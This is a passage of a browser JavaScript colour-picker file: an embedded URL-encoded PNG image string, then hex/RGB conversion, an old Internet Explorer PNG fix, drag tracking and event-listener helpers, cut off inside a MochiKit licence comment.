     "jdYDkHcPSJauaPEy1IBpGeYAVfgSjJrf19t4irRIN%2BogBVxpHGlatXMRTIdP%2FacDiGbnlaSrYnhIMvUxy9pPhpzF8HkrKQ7J"+
     "%2BgTkGKF83qX1fgKCRWba4%2BldONuO53VI9Q7mfFt5wyIFc5LRuIA0uw2SVYQvAlY849i5i3c7l6DL8NRT0NrpeY%2B958%2Fe"+
     "nhb%2FJieF9cmNp6mj3US64WTI2Ud%2BPPv6eaCLb3cAKaEKFmRYSkpSiS%2BIzynh9eITKxsHi1wxklUHXzAGiMlDxsCkDUsQgi"+
     "6fl2P8qU3zkPMEBAtTP2%2F%2FOXrIEX%2B%2FPx1FATmPq14BpCB1DMuFC054z%2FBdo8sbGXZoFQxTlKxeAXe%2Bd6TnKklV6G"+
     "GW%2BdK4EE5Adh24H7I2TP3zPd732ENq7yGHkzAgxy0PDwfBXLKQjkxnpo7UIiYVMKatYvkxyVMBCEiUHR5SSNa0g3dguGk0a%2B"+
     "9iFcaI1ENYsuoJj8Te08wLhqlvx4khzth7pq1v558jHI29MeR5XJUAQUpJM0CQslPnTX6FDD6gyYmKHRBahTN1GYRgIll96SETXD"+
     "AEYXCoAZd6CMLAHeGMsHnIuDEO%2FL3F3vaXIQaQ%2FROSXz4z15cBUTPnrhEYVnLADaYee3ef2qJM4CkpXUnpa4NDFD%2Bt2osx"+
     "9fZ%2FyfQqSBVLVg09pN2JFc5DMFKWA6T19XbC%2FsaAlPidx4mYhNjJ1xBwEY6XELpFZ4izcQeERForWY09lKuEEyPgXjCkS9U5"+
     "y2qSdY4Ty2njBeohb03CDg85Je1bD7%2FHyeEGvuUhMGQFyAkEwh0ghkUTH4nwjJsSgDQilFGhgDUXKWaCdo10dY4TNeYahohUtT"+
     "5SRxuJsbd%2F5ZTVTP3o7d%2BojbSZVmPIjzUg5moGCIFWbsCjO9xbenxOtu9s6kOqQIbdzwLPYNuHJZAiGE0devJRd7k7cc8e0k"+
     "y930K6aw%2FpsRetjTRAvndA5pJl%2FWHs3ZTHjIcEi0dRw4%2BPBgmLnCBwMCl%2FbkgiztHPBNuA3QqXStYARAbuwUN6D4Hc04"+
     "tw5yIUkDbTOgDZnpIVAZmbt4iLadjzirfLXSHziDvhibuKix8hmEgW4jyX%2Fybw%2FKkwpKqpt1t%2BTqk6Y696CHj8%2FgnB8Z"+
     "0AOYfwvbE%2FAfkE5pCsNw%2FI7OvCI%2BZQuCtt35qriC%2FF%2FIwe1TYOCbqQPyKAzVXUxRGbB%2FGCDm2pofem3m2cTL2dhx"+
     "zfz7%2BgOvsIAXIw5Pib3OYlXwAkghJqHkpylHTFNyVAZrdYcSI%2FWoOpG8nS5hGuKg8XIUdRx9QKEZAaRidvF6Zez5A7CuLR1B"+
     "sw54Hu1wA5FzYtbx%2BEyJRpJlLJtjX28u6HDA4xy1Whk8sA8bRx8B9pgnJUY8%2BCIdJDKsZfSY3RSfOSt2DqDEib%2Bh5fWx%2"+
     "F5to9h%2FBIQuR9kNIbRsAHZ0enKQWBsWzLTghNi6to1gCBSRf%2FuSRjUeFPD6CQwZCpZjSFn7AUB0oaLqAGY1kMyIK0efg7jtx"+
     "kgIlIo0kN6yoK0iysIQCfigUUm6HLKQmJI39NYitTJE%2B4aH%2FQ1pixQN%2B%2FAkJkjAaKxFwkQAqb1kHeqh44h2wmIgkCcaH"+
     "3kYumFN1GybNcIS36LE4MZwESsBqDDJTCOZU3QHT0kMySa%2BVSyQD1EPQQtZdUzZbXwS%2BeHNNn6FK0vAJK4FAGZxtvElA8HR4"+
     "Jgz4NDgOZVoNE6dDgCEamzECKnqilDcEOyvgBIFcl63hN%2F3Bx0B5Bh24Ebkpmyh%2FBz2K5N60CZAJQYA%2FYJXwLRl77fURI4"+
     "gQQAlBPn40vJyh5Cpr5JU3%2Ba%2BlEQQbfN7Xo6chcQ2zr6M%2BGyEy10cosUarG09JS5pPyJkCVTl8pH0ytwqkKQrCo%2FreMs"+
     "HXQ3L7yHFDTvMID0gtgkq81%2B38jcZ4DAZaaZOMkEagKBFELEya0yJApYJb9xA0QEwx5Dki5VMN2cs1aMvSc3%2BrQ3jE7qPoB5"+
     "a7cBURt5SlVIWa2HnPfCdy9pDGnmPgFkzLJk13uwCKYC2zVCIZwxZOYhaUhCECTXSHkqDUeyhyRT30YbwRjDS1PvnGiAHE2d%2Fh"+
     "xhpKzOl36XFtrU96yJp5dkQEAnGBGQmVtgJkv8M3GHDmEBcQhhLBLESQSM09Ww84%2FkGaCBe%2BQGAVC6OJ3wEC8qar%2Bh%2Bi"+
     "lcfbjYZ1mdKScgBzM6IG9P7%2Bi3POzCkFPADCDnneyu4KFPcr2puyTlxiAwDMlJaogUWJxax1BO9OaBMN8FnXUMv6Alh2EID9zJ"+
     "1Luj9Nt%2FwLOswj2ETb3Pss4T9p3%2BSBoKyBl%2FLwEZxc6mLH6UBoWYSpbLVpkhMVedzxXR0gEi8UWZcjID2jwwUlZiSEXoId"+
     "jaiSGN3Qv6n3mi3%2BTQi6HE39M7hCGHl9wBxCSpBIjad1505kv%2Fc0zER0u%2BJv4UAfEOQ8azBheAGHRjypqaOoKZ95R18sX0"+
     "kHO4mGZaz4lW9xJiSOdJT1sekGzxMiqUrLQSKfUDhEWW4WLgRBqPjKmVdA2Tq2Bibx6WNA%2BJnsLdPKYsmNg7esgiZR0wbect2M"+
     "SQY%2Bb7fPVZEAkQ1zx4%2BjRb%2BmjnzsbR77HyjEgQaAVk%2BxZuECCcsmLsHaOTQs8JKUu4II6CLaSs%2FjdT6Och0BPDrZk6"+
     "zXyf%2F5%2FlwmSLGXIXkDiDyiaeuwZmkuUZIdeh4A23IKmCmV4h2bk%2BRonKpCxiSOWmDuJL%2BxOd7iHD2slDQOciJ1Pa1Xs7"+
     "rsJIW9rbIyA5R00Aiabu4aGjKLFx2feJN5KrkBjCIoVs38M1qsReBSLGXLqWHlL3zJTmL02yhqkfTb0QBFvoIScsY%2Fb7PKaquA"+
     "Yk1bzEBWVBXGx7VVK%2BUobU%2FdLG1TUQjmcbBOwgCYqQqoQhNMtClQFKhTZ1OTFEK4abANHco9%2FykAE5haufkkRAlnOqBMhS"+
     "pJJbrAFIrqFjRBkVJm6cwIw8NVwCFohJyiIbj5JV%2B6TLSlbzkHGmTl7SiiGdH2Kcjhw18TwluQcIx965qSs8WgU9M9jUMxR11M"+
     "QERJMnx5B4RbF35CgCrRqAnGQ9T0KQeggBUsbN1sfzJWWN2HsO4%2FvtpUOy6gGI4YSWvixno28jw3QhWTcYksVJJrkIWSsE3JLT"+
     "Fe4xZOMj3A6hk6xRE%2Bs%2B0tax96mPLAB5E4aIZF0AEnZ%2FNHXXuxMXFgwZj9PhU%2BCELr2TrNkVT3uVIXylAKVC2LLXaOo6"+
     "OtEeAhkyQo6rnkCMmkiTrTUg3c7TMpvG0U4%2BUgs3AjZhzCRXSW%2F3DKHmoYN2neuiBKuPpr4JQNLUsZasdh7SYKHRCdrIscfe"+
     "kbkwTL1eApKYYgC54xq5YchrNVUxTASLDg7Tc5xYnTdOn%2FDW8GhiiJWsY6e3VlLJ3Kmpd0DaGJ5N%2FbxxzjJk9JFrQCYscLFX"+
     "4XMQIPiBADOVrHD4tKdCOGUI3c7AwmWaRhOnLFl9uCg8EQ9B4fE795Bxfkix90xgXcA2ir%2FvXcAyIGmHBxAm9j037jAUSWnLMc"+
     "R4yG4aOkwV9DYeHr3NEMpg56MIw8VxhCumXmLK6vAcdh4GKfv5527n9zUgKKmHBECQGHMhWXr%2BcQKH8efJRceKMFMr9pJzqYqw"+
     "gc46UDIHMl8gp%2BgwKWvMsk5OpB5CNTF6ySFcNIwHO8o5%2B3WAyHw3AoJ0oBRM3QtYDdXReAbyIIUaemcTM6SxITOkgZYaOntI"+
     "jr1s6uAxYr8CHVBhpC1n6jT13bmVvFPyenoJ6L5fLoY8idVzitBDjKkX8wpZbANaOGrS8gdt38KTwZ8FIKkQ5tEJokS1Z9W9cg8Z"+
     "R7gY0qWjkyZSzkNKX3ye%2Fb7vMkg5Bey8W%2Bs2IDlPwdykgFmeypI1Y0jRhdfmjUkVNLkKLE7XHjJjCMb3zpAce9ssq1k83sax"+
     "FacsErCtCdgLgHC3mOcpwwkGTSSL05YxdWZBqILQs0FmyPheDAfoSMp5iGdMj7Y0OsEi9vKoEbmxbwGQAdPx5591AQjCbW7sHtHU"+
     "nRxdSpbG3sGQMCyJYtUELJi7BSS4ha2CJmXVyBBJV6EY9u9bl7Pa4VEv6SmLezt49nves6WAlPj9GJ1wMbRcmHIiSpYx9Sr9XeVK"+
     "YRlQriWLTgP7zzIEIKMODOlsqtJKKjOkO0zwEBQCgoGh2S%2BUIX0Y37%2FfBkRZVCaLnvmiklU%2FnIk7Ux8xuO6hmV8yhMbvsb"+
     "FjImB0PSbAG4MjvJl6CIXgw%2BQHENLbh2S9BghF2yksMw9R6BjCAi9ZQ5YiF4Cq8CCN2xND%2Bpn6zENiMWxDxQAFzbLacJE8pN"+
     "K0t1C6ev7svB4jxyxZ51nJCpBQ8zhxudIHD0%2FjAssPXI6CjbjQ8z8CK8%2BxvI1DYu%2FcQ9pwcWeYsplTD5l6SDP1aO7a2zVz"+
     "nSH4ChANvMYtMBMpATJIVkHqIROGRFgiPL15eMlKsdcJWU0MobtOhDE2ZSUP6UN4NfVu7d1RCJCtheAuXWtAwjhEDqBckprnKdtD"+
     "xNQxGSCi39QDsfFbDCGwnIcMvtBPa%2F%2FpSFcnC3o7yR6ykZNEU5di2DPXe2wlERCSqglPrKl7EMagUCSrRokC5aooSyd%2Fxn"+
     "MJgtE5PCA%2B9sbRCZpdR7GqYuYqYdLUR02kITw1doFAJltj9nsa%2FuElXwfEB11o4z73N0kWM%2BYGQ4aHsKmPgXvwibH7Qbvf"+
     "c4LljEeIQ6Q2uWIPaVOsPn7vs9%2FzqjX29kcKaCJVAiDvPYHdBiTnq7qAZ%2BYoSbKYZ8KCEWmzh%2BhzbjPE5Cr1jAbFtmtTP%"+
     "2FZ7bfPddg%2B8THsXpt5nwDzZeustfgNPgh0g1kmWeUoFy8rXYE039Jlkcf4aQxJp6loM5wxRiw8egjw62eTRlLLaPb50tRFrjK"+
     "lDbg7SyZZpJS1trQDRJJVTlkZbdY1RARdMqZYhNHAH32VlYq92jQhIuHIM6VdaDIUvtVv9ELKqvb2bu9zy0KHgzCWz31uAjGGJzq"+
     "sAE1fVA5KHWCCYFZEhNN81HhJiLxBkqYqchWlv8BAzOtFiiDGMV2DOwAw5HcHWrb1%2Fl%2F4%2BmPIm8PQ7468BUQgiF0zXmLoF"+
     "QuWDjENihmrPqgkcSVl8iw8SMOYqw9S%2FJrGi8xDIiSFM7BVTb95Bf6QAuTkIb5YhK0B4MgUztZK9rf4AvV9kJVkMGjMkGbgzdf"+
     "WZnqtmgCQImC8CDYXgSgJWQ%2FaykqWTLQJGQ7Dp7TcACSxwcjSD4EKycqoyDBEPkWJIsdflKiCORaBDxs3yhXkwJGtTASORois%"+
     "2BD0Eydb71AcyQ8jIgOjoZ4hRSFtl4ELDIJRqpw5u6GPfcQ9CvJbReMMT1kC5RKfaOua8WQ5YsGaTQCfvZ20f83VrspQnw4MsrgJ"+
     "gwS48lmAwE3Dnc%2BDAyREfrgyFQMy%2FaQ%2Bg5JRl%2BACQwRH%2B6xUlX6iEiWRgWPxwlMiWGYK6JMla5BkR8QkfrCCUwPZpj"+
     "LwHxAkOsd%2Bx8awJoeRGX3sVeA0%2BY9iINFYNIudnv%2BDqY8uZHjRjSRY6yAiT5xAyCBScyEKn6iamP67pneEbjgLIACk%2F%"+
     "2BWRidxKYOdx1uJV1JFpl6SaMTuhdF%2BNKlCxqCDSDGxi0g%2BdGVhygzgkRZFsTmoR4iMK0YcukhwhCkpo4wyxpylnqI8RCMaW"+
     "8JgEQP2QYgOTNFQGbsqeFRx5c7kjVjyMxD2MBLSEuXgFgBo9HJpWQNuCr9LAMSGeIkqzhTn5n5TMAil9iikRf7iwyRlDX5WZlIlg"+
     "PCe0gYLs5MfSpZMow3HtI4UYgTGx3o0uz3BOYSkOpjL4rr5lO%2BqB9oynpeAzo4TBCod5QXGYIeYpcMuZSsIVwsUiNfVQGERo6j"+
     "lSBNtu4CogI2yVOWE1IBM1MCA8qSIfIV8%2BaBeYI6Xxlt%2B6aHIMyy5KdpstXcAjOGRIvXEPw6ICkYT3MVXpEsxxDt5uIh1M2j"+
     "jUN3%2F3UP4ZR1W7JKU%2FyQubKHlHY0S4D0ydZPAQJcG%2FcdD%2BEzDjH1Psui3Y8kR23H1x0XrqFgFTmcJXjumDqKcCLH3vI8"+
     "XioTU%2B9%2FGAr1kOEkF4D0zDXvGAsPqXPJsi5xgyGzdDUHJDkKT3ZlqnvPQyZNvZA4maYuvKnjRgjwFbeSFSCYlD7EGW1e7AxP"+
     "lKwq3oHBCb0aKSv5TGXORGAwib1WwOrEYSqqeEc%2FMQx8qSJgzfBpyBhGjnS8m2riHBCXkiYB14rU0swZgImpm5TF6Qq032Eibb"+
     "b46CEbQZemvXyTQzL3bTiL6%2B3IXvJcdLL4LmepJl4AMurisaMNILqgYXkB7d7FpCwnWVVYVB1PhofkzOXs2%2FUQcpT2rHQbED"+
     "82gi%2FF3trjgHgIwilJuznoVUCGWNVx%2B2hMUAveWA9RycqmPou2whdiSOBNKoYKiPUQTWJq8jXWRO0hqBceErzE9fZx7xbepD"+
     "Q6QHQyFZ1BoNNo20teconUP1BkwK67fvClsSebuWQvnWVdx97kEp0TKmjqHSH2HlafPYSBKAECvqrm6nVA1C0oEsfJVJhTTcycn8"+
     "2ewhZPTZ2WFcICmMWOrtOWv3rjRwrFq5Qlo5MwSMH4TimLOOH4YgGJo8IQbaGDwBsespSsYOrMEK2CKU9BZEmvZv4ikdbwJcVezH"+
     "oICRjkdIR7iJo69XeNxNRKen%2B%2FA0h6ROHxrlGoUau4Rc9QTqDv7Ro8BAjjRJIla9%2B4frQGk9%2Fouc7Uu0hZD6FRI5u6gS"+
     "fVxBUgqXdrJw%2FW7iBI4tQlLwsZD0L00dEqSHhC1yjRxvkOLK2J4dFNi%2BGYZek4EYEx3kOGqaMYc5fJ1jhNpIFjeRWQkKeQrT"+
     "p7SElGzhwA%2BcJUsjhX0fIi1DzA7%2F4yfzSkqhR7aYDS4aEgMBhkJlvJ3A9mKDzt%2Bz1AcsCFMWyxeuczAwIrWeFZJf%2FXly"+
     "4%2FI8OURUpj77bgS82xNxXCzhBoCB5jyQo6rjKmHuFhAXvDC4CYPIUyNfWw73sKIskKyamkxTYMkcVG2O%2FFiJSJvQwa23ac9t"+
     "IIUTkRhosMjzP1G4C8iYAZQAqKBSTEXhgI2MZz6YO37ThApJ8aRiB387TY0Eg7T1kyOtmycAV4OOiyhwyRiqZOM2AC5K2%2FgoHY"+
     "IiApVyGKVYi9tyEQi3%2Fhv8gFXHKiIHQMzHmzhXer574N3RwqZJU6y8ZAGg8ZKavG2S8PUjog7VN2D0QGJHMj%2Fix5CIGlklV1"+
     "ssXjkf7dL325DYGK0%2BQ5PDqhTt4ZEYthcJY%2BSMk1kb6fKWucjmAA0wPyBSDT7GQAWXsIFpJFr6HrPFonATvnu6nYXS29g4lG"+
     "J2GU0riQw29d8KVSQObvPfbidUAiENxD%2BGdYQyABN0tWNHVT%2FoBJBQyLjrzYroe42Eu7vYgMRbhsygoheKOsJd97V6GaiDFC"+
     "6RbvAAnMcI0j8aRfOw9hyRLoKo0N%2B3WYTGn%2B8eauvFEIjKmzbQfh01Asw0X%2BTjZeEYbxPWsVEqkegmNv%2F0lA5m7Bpn5h"+
     "0%2BeSCUxjoptMHXFwCA6zmKUsYUh4hROwipyvQg8JoFFvp9LIZl4nKes%2BIJyd7rkFR%2BIsUiJ5%2BkzzX5SsXBbZ4ldB1zPE"+
     "glYJtCK7naWoSxeH38CPYOoJmNBDksUzMBNAQtCNsRfZZyhXWXiMZHWJmkIQxAlmmac27k09eogCDDpTH%2FDwQVXiy8bwBgFrAF"+
     "Hs5cHjsPbbgMjejvadx%2BdlCY9IVoI2Li%2BQBiDIzmJTVmzquOEhkqt41JjTVoSA4AsCxrG3AUIWfwkIwik4XHZCkB4RqakYBc"+
     "maPGqHJQhng0Hkkj%2BklFaDS2S%2BVHmHmnrIeIeKUBODkG0iYN1ZvMUjjVUsIDElqX3nlKUewuPymWSFJQMyBBB9l8UGnHELp5"+
     "yAFdnfJTFE7kKhQQqBJTJHN9NR5uIYMCDoI3qSMTtWmQIikoPp0murMB4Slgq7kSwFQpbQiZW%2Fqk6y3HPSKyKI1YHXH60iZJVe"+
     "YQYpWhfV4um4aglICrx8cpHkjLKXW2AWDitZ4%2FWDVZqZIHsZab%2Fn55TJVeTUptCjEgeGHBUBZssDFXNV2Wfkasstvvf2eh%2"+
     "BQEHsnz%2FSArK96KMiSld3CsijudywYsq34Iq%2BpKfDSvMsCUpFOR2iZt9Dmq%2FxsDFI6ICxAziHQQ6dbXqDOPMRcmVQVfGLB"+
     "kIksAfVKnLJtJ4bUCXg1sapOr4a%2FUMoKV3KIpZOt57MmgDAnkEyZlxPRJ1zAnTAEwhXPiX5FDeZKpJDEqSxAqwHgKUNUwDQEE0"+
     "%2FGZ8pABcM1BgT1BUAST2zADUs92%2F36XPUMl6hiZirJERJfbjNkLHIN77u5qxB%2F5fwwh2BoEqv2qgvZPUC8cA1ZCjyZLLrP"+
     "T31%2FJ0aILFlHgKh%2BWUTj8YwIzJZBMw6zCcwhDPPjebIFGaEIPKmrnP%2B%2FrOeAxEW3i9zdIk%2Bvwu6n2GvZw0e4srCpVc"+
     "AuL%2Ba5ysVemJQ1Z0gCgvmQenuYbMXYO%2BBhAUst3gGSxiIX4gRZwAUEQXjQfwHo6YbvGjH2hiQ1bRwBmDp5TmKIPEeAGWMX10"+
     "pQffZieNhRgoBdAaJHSxNxwpIFQZRIhtCNWo1bMpNOcsnb3KJ7sNbPya%2BpSaxSU0923iAkww%2BxN9VE6ygMiFnsYe7SQ%2BZ%"+
     "2BEV0jccGZ93ynx708sfE4OqHsFERqHgPC%2BwlDDG9qkLUaLZ6ZYlrJKV1rQOKBat%2Bf1EPULUpYRhAL1GeqPj9kJBqxkywRQ2"+
     "K68sbt3WIuZBRPiTFRrGIYJp%2FJ0FS4fLYhHPNSNH4VEFrQMCoU%2BdBHww0LKe6W8GgJ4mICrnUEXEnW9NGaPKQmAav0DtU8ug"+
     "k8mwC8hRwW%2BfKzgHj7pkcjJyYCJu%2FDzpSTFOJ%2BD1A6hpQpQyq9zwuSJcvb9r%2FnCzf1OMv6GUC8P4h9a3935pwhCM%2Fg"+
     "XR%2B9g0Uqs0dgwlqysqkb2w4MkddsFq5s3MwGfafNRuNKUDT2fQmQiZFba5cix5IVe0eyfiNSyeI9BGVi%2BDU%2FGmUtMySejk"+
     "DnXbrkKlJRutTGvwLIDJYlXJSrUoRl66Te0bKblRy%2FvAy4hWcmZwkCXk7iD8vb8X8ZmGrkC9m3DhnH1zJyVRw8rgGpYtjaH9zS"+
     "dw%2BZ2TjD4ziwBGJu9cvn0NJvM9DuMERgYz8gyZLFF1DjeCVPhAXQBEhoHgYQyVM5V808ZLK%2FI3NWIlWDPMYFnRg2lgOVvhwT"+
     "hggXzIRrkqvkp4k3DpBKn7prnoqAVMpRDhBn2VMPyeNDF3hnPSQsOrCQLPsKXbKbpo7cSqp5xZYFbAHIYM8ApP2%2BcVgyaxUce5"+
     "2dLzmRJEtMvKQ8hMnux5IFU0CmLHIMkSUPMDm%2BVB1HtldQTI5tvmJm%2BAUWEOVL36UTLvTlnHAiP1ZMDCYQ%2B%2FJiutjxfa"+
     "xkWS9ipT%2B%2FGpN3bJpKVlvuIHlVXCc4ypcBkaVCWA51GN3DtpOnRYbs4iGTJfFnvryToBzMt8iuz5%2BxpXeXO1IExCBZKVdF"+
     "L%2FFXXwAkSU8%2B99PjprB3kZNTPgMnN3JOIn7jOOEYcgvCqWS5lGVZVBEmwdFDgtWbYcsVIBcQ6MHS5BUqP2WekTQCpCvynZUj"+
     "mOwW4alTIVsxJJm6il56TjVSR7KmFi9s0XhwDxDNNuoWxtSTh9jntKswYl91jOV%2BX10FIQtLt2BIMvkNYV4cXhG7iDSWnwAkSA"+
     "1SOoJReV78EvZgMT6jn%2B0zmHOUqUh5OTOPboFhKj2TlCWuUWnJyUPC95C5QhJbAxKXWReyLZI19ZHEdCdHt6he1hY9JHHMJykD"+
     "gQFEdn2JJTByIrLJSpaM5uN8WGqf5i1z5QHJUEAtWkeC2RHcWGS6vxH%2ByY4%2FvFQwC3pTsgKEM4ZkiRJTj5LlPSQGZZ0IB3iU"+
     "UwX7zC8iIJ4FszZepZ1Uy7T2bjC7FzeWF9cMib4wedeZjRdKUkay7LtnYNZ8qQK6ByRGWpOZ4PxBFhthJ2O6nLww8wVd7fcFIAtg"+
     "K%2F8GhhP8G9QocxY0qYn9J8qXBM8fAEgWucnCIcXL%2Fg70GRGCi6WfcGr9Ci84kSFh0rWSLMOpal5BQFq%2BbOEVCkgsdjN%2F"+
     "cLI2ax5h78IsByaydGO%2Fzxly4SFxC2zmUzo8WbLS7q8ibtv4nhiWABFgrgCJ%2FjBEKT03yVFOYFOrV6DjgtqUdYchlzBtE8mK"+
     "i60iExc7OhSJFL3bRMCuAammhdOUiZ4dihw%2FJ1bA0VHoOSUJhoM9LGTmRAe8msWty%2FeR4eKoiTmRyb%2BsujCc5Kwm2K2A%2"+
     "FQGAZJ8YXAj%2FcKR%2FuPsHw%2B3pBLdCuVreKYRZlGQHx0%2FZougZgDf5lE16zNcBMXaedZwXGwhWTf%2FU1DzCMuRFji7kIS"+
     "gvQlDNZ08Eh5YpL52RLEpSyUMCMGsBI0fp%2F0IDiLZou9gj6WQPMa4xRi8ukbkl1PdbmLoH5MVXyGKHn9bE3JTEQl8PsCdxq1Ow"+
     "VoDw3rWADMBMKnJmaWAq7C2TpStmsdMr%2BJNdnpqAtk0ZkgNukCXnISmXScoaImWCwxyQlIRwseRi6uGfhrRbYfZw3gQr%2B%2F"+
     "0yQ%2BxyFvuZji9ZsiSJGQirelQCRA6EMyDnglr3oPzjl3f4TPqnuv0dmTV5hyk8Nxly%2BWganUz5UtOj29zw8wiFYwD7VIDuCh"+
     "AvVixHdtFhrBTTBQT%2FU70cmSZzExBn6twb9N%2ByZNOMBVOpuhapnwLEdQzNZQvQ9F3M%2FuTm4eVI392NRebsGScXE0DDZxpx"+
     "CkmK42vYRPqcGrObAhLeZQGIvaLFAeICZnsE%2FDIgMEKflXzH7P5y4zmJIfPnjMwzh9TyOHgItxLimOPEFSA8LJk5ghY4ywLYfz"+
     "gwFxxcLtZU9G4udvzMapnrXrNNN0E1n1nN7%2Bzic2ZWlU29ACQ17SAbKl3CE%2FOPwFRiUjFcu4W%2Bw1yy0m87vQrvVxfvUO07"+
     "1MTKuoTQXHlAomAkQHRXcLSVX38WYctCMKygTQw%2F7c%2FLq0sP0d5tnktBQCCsZoNs4TepKBMIavpNPCCL%2FY74i1pZmnFKX1"+
     "lWnJjsd7wOCOt5ZsSUcVt2IW4l5nfeAoTyPlYILwGxIXaykHEPzpYD%2Bk8KjIiwLMXlCjSz2PrZc4bMF2niDGkT1LQJKupL8DAg"+
     "a06kfzjSHhSfMAsHzPaw8a2LhUwwGU6sN0HgsXbzCcfc8tbF6x0r6xKem4AUR%2BwkXeH1brfyabzbn3a%2FOyBeYMjkFZsP3hPw"+
     "6vIz6xRuM0N%2BHZBq8xD8viSmuL3nd3venyXvyLyQ1wK04ML6OSkz3fitN%2Ff7xKbueogMZOpLgMgvDk9l5yjhF0UOkDOG0Fh%"+
     "2FKk5u0S8B9UJG9%2FZefWa0evt71cXvVW3drMnB96lrTPdy2jnR1L2YZJGzUpiXF64T3GdI%2BozqXeySldtKGLOpO%2BmSz6jm"+
     "MxiQOC2a7r2JxHjNn0FIMeDGgvr97hfQc2qyow1HnUXP3yGIXZm7RljLzfarO4AYouPGcgAzu10xBLcW%2B4pTC9eZpazLd0%2Bg"+
     "Xb77WghfBOR6cTD5RevckSavmOr7LL3deoVjZZ28Yrb73Tbabr6iLn6vOv0MBcRF28VCzrOXlx%2BsesilNCz3%2B5wh812%2FkC"+
     "z%2FfvX2%2B20LYIOjJF2Kqr%2B7Rb%2Fee2Vu0JfLac9Q7nnIHUBWzkRBpeJLkOZes%2BRxvfh3ZUAmi35p0Qzh1eIkBb%2B3vL"+
     "jHosk%2FdVt8xtc3wfbCv3O78Rk3AUkWfb0cJgrPc1l9cfd%2FgSHL55QLaU7StV%2F%2Bzuk51T4nb3wfVJc0vQfhffJjCWm9gv"+
     "Q%2BINMWMdX3tW%2B9zsobSvQFQBSWV15x21IX%2Fwy8%2BIrt1r%2FkugndcUcF4pVXXANywwonfLncVcvl2F%2BC9GsMgTuzfP"+
     "kzzQ7f7nzmhfasAfmafNzh1LWl%2FtcAcuP9tj%2Fit7y50e4D8kLKenU5v7a8WH5KfQnCL24CvJYm%2F1mA%2FAEfewnIfz9Dvg"+
     "bI%2FrNr%2BccA8pOc%2Bqd85j8DkP2f%2F1v%2Bf2jmJBw1Fe8SAAAAAElFTkSuQmCC";
     
  // Here are some boring utility functions. The real code comes later.
  function hexToRgb(hex_string, default_){
    if (default_ == undefined)
        default_ = null;
    if (hex_string.substr(0, 1) == '#')
        hex_string = hex_string.substr(1);
    var r;
    var g;
    var b;
    if (hex_string.length == 3) {
      r = hex_string.substr(0, 1);
      r += r;
      g = hex_string.substr(1, 1);
      g += g;
      b = hex_string.substr(2, 1);
      b += b;
    } else if (hex_string.length == 6) {
      r = hex_string.substr(0, 2);
      g = hex_string.substr(2, 2);
      b = hex_string.substr(4, 2);
    } else {
      return default_;
    }
    r = parseInt(r, 16);
    g = parseInt(g, 16);
    b = parseInt(b, 16);
    if (isNaN(r) || isNaN(g) || isNaN(b))
      return default_;
    else
      return {r: r / 255, g: g / 255, b: b / 255};
  }
  
  function rgbToHex(r, g, b, includeHash) {
    r = Math.round(r * 255);
    g = Math.round(g * 255);
    b = Math.round(b * 255);
    if (includeHash == undefined)
      includeHash = true;
    r = r.toString(16);
    if (r.length == 1)
      r = '0' + r;
    g = g.toString(16);
    if (g.length == 1)
      g = '0' + g;
    b = b.toString(16);
    if (b.length == 1)
      b = '0' + b;
    return ((includeHash ? '#' : '') + r + g + b).toUpperCase();
  }
  
  var arVersion = navigator.appVersion.split("MSIE");
  var version = parseFloat(arVersion[1]);
  
  function fixPNG(myImage) {
    if ((version >= 5.5) && (version < 7) && (document.body.filters)) {
      var node = document.createElement('span');
      node.id = myImage.id;
      node.className = myImage.className;
      node.title = myImage.title;
      node.style.cssText = myImage.style.cssText;
      node.style.setAttribute('filter', "progid:DXImageTransform.Microsoft.AlphaImageLoader" + "(src=\'" + myImage.src + "\', sizingMethod='scale')");
      node.style.fontSize = '0';
      node.style.width = myImage.width.toString() + 'px';
      node.style.height = myImage.height.toString() + 'px';
      node.style.display = 'inline-block';
      return node;
    } else {
      return myImage.cloneNode(false);
    }
  }
  
  function trackDrag(node, handler) {
    function fixCoords(x, y) {
      var nodePageCoords = pageCoords(node);
      x = (x - nodePageCoords.x) + document.documentElement.scrollLeft;
      y = (y - nodePageCoords.y) + document.documentElement.scrollTop;
      if (x < 0) x = 0;
      if (y < 0) y = 0;
      if (x > node.offsetWidth - 1) x = node.offsetWidth - 1;
      if (y > node.offsetHeight - 1) y = node.offsetHeight - 1;
      return {x: x, y: y};
    }
    function mouseDown(ev) {
      var coords = fixCoords(ev.clientX, ev.clientY);
      var lastX = coords.x;
      var lastY = coords.y;
      handler(coords.x, coords.y);
      function moveHandler(ev) {
        var coords = fixCoords(ev.clientX, ev.clientY);
        if (coords.x != lastX || coords.y != lastY) {
          lastX = coords.x;
          lastY = coords.y;
          handler(coords.x, coords.y);
        }
      }
      function upHandler(ev) {
        myRemoveEventListener(document, 'mouseup', upHandler);
        myRemoveEventListener(document, 'mousemove', moveHandler);
        myAddEventListener(node, 'mousedown', mouseDown);
      }
      myAddEventListener(document, 'mouseup', upHandler);
      myAddEventListener(document, 'mousemove', moveHandler);
      myRemoveEventListener(node, 'mousedown', mouseDown);
      if (ev.preventDefault) ev.preventDefault();
    }
    myAddEventListener(node, 'mousedown', mouseDown);
    //node.onmousedown = function(e) { return false; };
    //node.onselectstart = function(e) { return false; };
    //node.ondragstart = function(e) { return false; };
  }
  
  var eventListeners = [];
  
  function findEventListener(node, event, handler) {
    var i;
    for (i in eventListeners)
      if (eventListeners[i].node == node && eventListeners[i].event == event && eventListeners[i].handler == handler)
        return i;
    return null;
  }
  
  function myAddEventListener(node, event, handler) {
    if (findEventListener(node, event, handler) != null)
      return;
    if (!node.addEventListener)
      node.attachEvent('on' + event, handler);
    else
      node.addEventListener(event, handler, false);
    eventListeners.push({node: node, event: event, handler: handler});
  }
  
  function removeEventListenerIndex(index) {
    var eventListener = eventListeners[index];
    delete eventListeners[index];
    if (!eventListener.node.removeEventListener)
      eventListener.node.detachEvent('on' + eventListener.event, eventListener.handler);
    else
      eventListener.node.removeEventListener(eventListener.event, eventListener.handler, false);
  }
  
  function myRemoveEventListener(node, event, handler) {
    removeEventListenerIndex(findEventListener(node, event, handler));
  }
  function cleanupEventListeners() {
    var i;
    for (i = eventListeners.length; i > 0; i--)
      if (eventListeners[i] != undefined)
        removeEventListenerIndex(i);
  }
  
  myAddEventListener(window, 'unload', cleanupEventListeners);
  
  // This copyright statement applies to the following two functions,
  // which are taken from MochiKit.
  //
  // Copyright 2005 Bob Ippolito <bob@redivi.com>
  //
  // Permission is hereby granted, free of charge, to any person obtaining
  // a copy of this software and associated documentation files (the
  // \"Software\"), to deal in the Software without restriction, including
  // without limitation the rights to use, copy, modify, merge, publish,
